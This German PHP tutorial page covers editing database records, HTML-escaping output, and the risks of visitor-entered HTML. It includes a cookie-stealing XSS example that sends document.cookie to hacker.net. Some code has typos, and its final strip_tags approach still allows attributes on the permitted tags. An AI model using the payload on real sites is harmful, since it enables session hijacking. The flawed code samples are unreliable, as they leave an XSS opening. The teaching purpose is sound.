---
title: Daten Bearbeiten
order: 40
---

<script>document.location="/php-db-schreiben/daten-editieren/";</script>

Wir wollen einen Datensatz aus der Datenbank laden, in einem Formular zur
Bearbeitung anbieten, und dann wieder in der Datenbank speichern.

![Formular zum Bearbeiten einer Person](/images/person_edit.png)

Das Lesen des Datensatzes aus der Datenbank erfolgt nun auch mit einem prepared Statement,
da die ID aus dem GET-Parameter gelesen wurde:

<php caption="laden des Datensatzes, der editiert werden soll">
$sth = $dbh->prepare( "SELECT * FROM users WHERE id=?" );
$sth->execute( array( $id ) );
$person = $sth->fetch();
</php>

### Das Bearbeitungs-Formular

Bei der Darstellung des Bearbeitungs-Formulars werden die Daten nun als
Standardwerte dargestellt. Das passiert bei Textfeldern mit dem Value-Attribute
und bei Textareas als Inhalt des Tags:

<htmlcode>
<input name="firstname" value="Tobias">
<textarea name="description" rows="7">Webdesigner</textarea>
</htmlcode>

Achtung: Falls in den Daten Anführungszeichen, kaufmännische Unds oder
Kleiner-Zeichen vorkommen müssen diese für HTML escaped werden.  Hier ein
Beispiel in MySQL:

<sql>
MariaDB [portfolio_playground]> select firstname,description from users where id=438;
+--------------------+--------------------------------+
| firstname          | description                    |
+--------------------+--------------------------------+
| Tobias "der Coder" | Mein Lieblings-Tag ist <style> |
+--------------------+--------------------------------+
1 row in set (0.00 sec)
</sql>

So würde die Darstellung der Eingabefelder nicht funktionieren:

<htmlcode>
<input name="firstname" value="Tobias "the Coder"">
<textarea name="description" rows="7">Mein Lieblings-Tag ist <style></textarea>
</htmlcode>

Das Attribut `value` endet zu früh, und der `<style>` Tag lässt
den Rest der Webseite verschwinden.

§

Richtig ist die Darstellung gewisser Zeichen als HTML Entities:

<htmlcode>
<input name="firstname" value="Tobias &quot;the coder&quot;">
<textarea name="description" rows="7">Mein Lieblings-Tag ist &lt;style&gt;</textarea>
</htmlcode>

Diese Ersetzung wird mit der Funktion
`htmlspecialchars`[&rarr;](http://www.php.net/manual/en/function.htmlspecialchars.php) vorgenommen:

<php>
htmlspecialchars( $person->firstname );
</php>
§

Zusammenfassend sieht die Darstellung des Eingabeformulars so aus:

<php caption="Darstellung eines Eingabe-Felds des Edit-Formulars mit PHP">
<input name="firstname" value="<?php echo htmlspecialchars( $person->firstname ) ?>">
<textarea name="description" rows="7"><?php echo htmlspecialchars( $person->description ) ?></textarea>
</php>

### Verarbeitung des POST-Request

Die veränderten Daten werden mit POST an person_edit.php geschickt. Aus den Daten wird ein UPDATE-Statement erstellt:

<php caption="Update der Daten von PHP aus">
$sth = $dbh->prepare(
  "UPDATE users SET
    firstname=?,surname=?,email=?,
    profile_visible=?,description=? 
   WHERE id=?");

$update_went_ok = $sth->execute(
  array(
    $_POST['firstname'],
    $_POST['surname'],
    $_POST['email'],
    $_POST['profile_visible'],
    $_POST['description'],
    $_POST['id']
  )
);

header("Location: person.php?id=" . $_POST['id']);
exit;
</php>

Escapen von HTML
-----------------
Das Escapen der Daten für HTML hätten wir von Anfang an bei jeder Ausgabe von Daten aus der Datenbank durchführen müssen. Wir haben bisher einfach die Daten direkt mit echo ausgegeben:

<php caption="Ausgabe von Daten aus der Datenbank ohne html-escaping">
<?php echo $person->firstname ?>
<?php echo $person->surname ?>
hat insgesamt  <?php echo $no ?> Werke in dieser Datenbank.
// problematisch!
</php>

§

Wenn hier in der Description „Mein Lieblings-Tag ist &lt;style&gt;“ steht, und dieser Text einfach ausgegeben wird, dann „verschwindet“ der Rest der Webseite, weil er sich nun innerhalb eines Style-Tags befindet.

<php caption="Ausgabe von Daten aus der Datenbank mit html-escaping">
$username    = htmlspecialchars( $person->username     );
$firstname   = htmlspecialchars( $person->firstname    );
$surname     = htmlspecialchars( $person->surname      );
$description = htmlspecialchars( $person->description' );

echo <<<EOM
  <p>$anrede $vorname $nachname hat insgesamt 
  $no Werke in dieser Datenbank.
  $ersie hat den Usernamen $username.</p>

  <div>$description</div>
EOM;
</php>

Damit funktioniert nun die Darstellung des Datensatzes richtig:

![Korrekte Darstellung eines Datensatzes mit kleiner-Zeichen](/images/html-escaped1.png)

 Darstellen von HTML
---------------------
Im letzten Beispielen wurde der eingegebene HTML-Tag sichtbar auf der Webseite
angezeigt. Wie kann man HTML-Tags eingeben, abspeichern, und als HTML-Tags
wieder anzeigen?

### Gefahren
Zuerst eine Warnung: Die Anzeige von HTML das von Fremden eingegeben wurde ist
gefährlich! Dazu zwei Beispiele: Sie bauen ein Gästebuch in dem BesucherInnen
beliebiges HTML abspeichern können. Herr Lauscher trägt dort ein Bild ein:

<htmlcode>
<img src="http://lauscher.net/bild.php?woher=gaestebuch_mmt" alt="harmloses bild">
</htmlcode>

Das Bild wird also nicht von Ihrem Webserver geladen, sondern vom Webserver von
Herrn Lauscher. Und dort wird gleich ein php-Programm zum Erzeugen des Bildes
aufgerufen. D.h. Herr Lauscher kann sehr bequem mit-loggen wie viele Zugriffe
auf das Gästebuch erfolgen. Falls Herr Lauscher die Gästebuch-Besucher schon
kennt (schon ein Cookie in Ihrem Browser gesetzt hat) kann er sie auch
identifizieren.

Sie haben Herrn Lauscher also die Möglichkeit gegeben sehr viel über Ihre
BesucherInne zu erfahren. So etwas ähnliches passiert z.B. wenn Sie Google
Analytics in Ihre Webseite einbinden um Zugriffs-Statistiken zu erstellen:
Google erfährt von jedem Zugriff auf Ihre Seite, Google kennt viele
BesucherInnen schon (weil Sie bei gmail.com eingeloggt sind oder von einer
vorhergehenden Suche noch ein Cookie haben.)

§

Im zweiten Beispiel gibt Frau Hacker neben einem Bild noch etwas JavaScript ein:

<htmlcode>
Hallo Welt 

<img src="http://hacker.net/bild.php" alt="harmloses bild" id="hack_tool" />
<script>
   document.getElementById("hack_tool").src += "?keks=" + document.cookie;
</script>
</htmlcode>

Mit der einen Zeile JavaScript wir das Cookie an die URL des Bildes angefügt, das Ergebnis ist z.B:

<htmlcode>
<img id="hack_tool" alt="harmloses bild" 
src="http://hacker.net/bild.php?keks=PHPSESSID=6b454e966f9fc9b9a9d5126ffb076115"/>
</htmlcode>

So kann Frau Hacker das Cookie einer BesucherIn Ihres Gästebuchs entwenden. Sie
kann nun das Cookie verwenden um als eingeloggter User Ihre Seite zu benützen!

Lassen Sie niemals, niemals, niemals zu, dass Fremde JavaScript in Ihre Site einspeisen können!

§

Noch hat unsere Applikation dieses Problem nicht: Wenn Frau Hacker Ihren Code
z.B. in das Profil einer Person eingibt wir der Code htmlescaped angezeigt und
„wirkt nicht“:

![Eingegebener HTML+JavaScript-Code wird escaped und dargestellt](/images/html-escaped.png)

### Eingabe von HTML

Die Eingabe des HTML-Codes können Sie mit einem JavaScript-Editor wie TinyMCE
erleichtern. TinyMCE verwandelt eine normale Textarea in einen wysiwyg-Editor:

![Normale Textarea (oben) kann mit TinyMCE in einen wysiwyg-Editor (unten) verwandelt werden](/images/tinymce.png)

Mit HTML5 gibt es auch die Möglichkeit ohne Textfeld, mit content-editable einen
Editor zu erstellen. Ein Beispiel dafür ist der Aloha Editor:

![Aloha Editor](/images/aloha.png)

### Behandlugn von eingegebenem HTML

Für die Beispiel-Applikation wollen wir Zulassen, dass im Profil die HTML-Tags
`<p>` und `<b>` verwendet werden können, mehr nicht. Dass es nur diese
Tags und keine anderen sind wird bei der Eingabe und der Bearbeitung sicher
gestellt:

<php>
$description = strip_tags( $_POST['description'], "<p><b>" );
</php>

Nun können Sie auch die Ausgabe des Profils umstellen und auf das escapen 
der `description` verzichten:

<php caption="Ausgabe von Daten aus der Datenbank mit html-escaping">
$username    = htmlspecialchars( $person->username     );
$firstname   = htmlspecialchars( $person->firstname    );
$surname     = htmlspecialchars( $person->surname      );
$description = strip_tags( $person->description,  "<p><b>" );

echo <<<EOM
  <p>$anrede $vorname $nachname hat insgesamt 
  $no Werke in dieser Datenbank.
  $ersie hat den Usernamen $username.</p>

  <div>$description</div>
EOM;
</php>

